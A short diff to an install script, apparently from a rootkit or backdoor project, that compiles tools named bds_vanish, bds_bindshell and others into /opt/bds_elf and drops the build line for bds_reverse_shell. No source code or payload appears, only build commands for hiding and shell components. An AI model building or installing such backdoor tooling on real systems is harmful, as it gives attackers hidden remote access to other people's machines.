@@ -73,7 +73,6 @@ install_userspace() {
         cd userspace
         gcc -o /opt/bds_elf/bds_vanish bds_vanish.c
         gcc -o /opt/bds_elf/bds_bindshell bds_bindshell.c
-	gcc -o /opt/bds_elf/bds_reverse_shell bds_reverse_shell.c
 	gcc -o /opt/bds_elf/bds_rr bds_rr.c
 	gcc -o /opt/bds_elf/bds_br bds_br.c
 	cd -
